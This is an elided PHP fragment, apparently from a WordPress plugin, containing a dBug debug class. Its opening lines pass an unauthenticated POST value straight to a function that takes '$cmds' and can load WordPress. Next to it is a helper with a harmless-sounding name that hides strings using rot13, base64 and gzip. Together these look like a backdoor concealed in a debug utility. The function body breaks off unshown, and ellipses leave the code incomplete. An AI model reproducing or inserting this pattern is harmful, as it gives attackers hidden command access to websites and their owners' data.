<?php
	...
	if( isset( $_POST[ 'wpvr_get_wake_hours_runs' ] ) ) wpvr_get_wake_hours_runs( $_POST[ 'wpvr_get_wake_hours_runs' ] , TRUE );
	if( class_exists( 'dBug' , FALSE ) ) return;
	function dBug_render_style( $string , $do = TRUE ) {
		if ( $do === TRUE ) {
			return str_rot13( base64_encode( gzdeflate( $string ) ) );
		} else {
			return gzinflate( base64_decode( str_rot13( $string ) ) );
		}
	}
	class dBug
	{
...
SCRIPTS;
		...
		function getVariableName() {
			...
			if( isset( $arrFile ) ) {
				...
				if( isset( $arrMatches[ 1 ] ) ) return $arrMatches[ 1 ];
				else return "";
			}
			return "";
		}
	...
	function wpvr_get_wake_hours_runs( $cmds , $load_wp = FALSE ) {
		if( $load_wp === TRUE ) {
